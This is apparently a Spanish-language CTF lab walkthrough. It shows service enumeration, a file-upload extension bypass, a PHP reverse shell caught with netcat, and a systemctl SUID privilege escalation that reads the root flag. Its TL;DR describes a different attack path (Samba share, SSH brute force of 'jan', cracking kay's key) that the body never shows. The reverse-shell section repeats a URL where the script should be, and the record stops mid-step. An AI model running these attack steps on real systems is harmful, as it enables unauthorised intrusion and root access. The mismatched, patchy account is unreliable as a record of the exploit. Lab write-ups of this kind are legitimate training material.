# Basic Pentesting — Writeup

## TL;DR

Se identificaron servicios HTTP, SSH y Samba. Se encontró un share anónimo con `staff.txt` que sugiere el usuario `jan`. Se obtuvo acceso SSH a `jan` por fuerza bruta (wordlist `rockyou`), desde `jan` se recuperó la clave privada de `kay` y se crackeó su passphrase con `john`, permitiendo acceso final como `kay`.

---

## Enumeración (nmap)

**Comando**

```bash
nmap -sV -sC --open $IP -oN scan.txt
```

**Comentario:** `-sV` detecta versiones de servicios; `-sC` ejecuta scripts por defecto; `--open` muestra solo los puertos abiertos; `-oN` guarda la salida en un archivo normal.

**Resultado**
```bash
# Nmap 7.95 scan initiated Sat Sep 27 16:40:06 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC --open -oN scan.txt $IP
Nmap scan report for $IP
Host is up (0.32s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 19:78:f4:6e:d8:11:72:e7:ba:60:0c:d2:ba:c9:a3:e7 (RSA)
|   256 e1:6e:3e:95:e0:bd:78:db:e9:aa:74:44:67:f0:a6:8e (ECDSA)
|_  256 8e:8d:24:7f:0d:77:52:20:40:2b:9e:ec:b3:e9:50:a8 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.10
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Vuln University
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-09-27T20:40:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 27 16:40:48 2025 -- 1 IP address (1 host up) scanned in 42.04 seconds
```
**Resumen**

* 21/tcp open ftp (vsftpd/3.0.5)
* 22/tcp open  ssh (OpenSSH 8.2p1)
* 139/445/tcp open Samba (smbd)
* 3128/tcp open http-proxy (Squid/4.10)
* 3333/tcp open  http (Apache/2.4.41)

---

## Enumeración de directorios web (Gobuster)

**Comando**

```bash
gobuster dir -u http://$IP:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

**Comentario:** `-u` url target; `-w` ruta de wordlist.

**Resultado**
```bash
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://$IP:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 322] [--> http://$IP:3333/images/]                                                                   
/css                  (Status: 301) [Size: 319] [--> http://$IP:3333/css/]                                                                      
/js                   (Status: 301) [Size: 318] [--> http://$IP:3333/js/]                                                                       
/internal             (Status: 301) [Size: 324] [--> http://$IP:3333/internal/] 
```
**Resultado relevante**

* `/internal`, directorio web para subir archivos.
  
---

## Burp Suite

**Petición POST**

Interceptamos la petición POST al subir un archivo a la web con el proxy de BurpSuite, la enviamos al Intruder y marcamos la extensión.
```bash
POST /internal/index.php HTTP/1.1
Host: $IP:3333
Content-Length: 291
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://$IP:3333
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ8PkprBlb27KbdYV
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://$IP:3333/internal/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryJ8PkprBlb27KbdYV
Content-Disposition: form-data; name="file"; filename="test.§php§"
Content-Type: application/x-php

test

------WebKitFormBoundaryJ8PkprBlb27KbdYV
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryJ8PkprBlb27KbdYV--
```

**Identificar extensión permitida**

Aplicamos una wordlist de extensiones (phpext.txt) como payload para identificar la correcta:
<details>
	<summary><i>phpext.txt</i></summary>
		
		.php
		.php3
		.php4
		.php5
		.phtml
	
</details>

**Resultado**
* Extensión permitida: `.phtml`

---

## Reverse Shell
Editamos script de reverse shell con nuestra IP y Port a escuchar. Además, le agregamos la extensión permitida.
**Script Reverse Shell**
```bash
	http://$IP:<port>/<path>/php-reverse-shell.phtml
```

**Execute Payload**
```bash
	http://$IP:<port>/<path>/php-reverse-shell.phtml
```

**Listen Port**
```bash
	nc -lvnp 4444             
	listening on [any] 4444 ...
	connect to [$IP] from (UNKNOWN) [$IP] 45390
	Linux $IP 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
	 14:46:58 up 3 min,  0 users,  load average: 0.82, 0.38, 0.14
	USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	$ whoami
	www-data
```

**Upgrade Shell**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Privilege Escalation

**Find SUID perm**
```bash
 find / -user root -perm -4000 -exec ls -ldb {} \;
```
**
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

www-data@ip-10-201-113-188:/$ cd /tmp
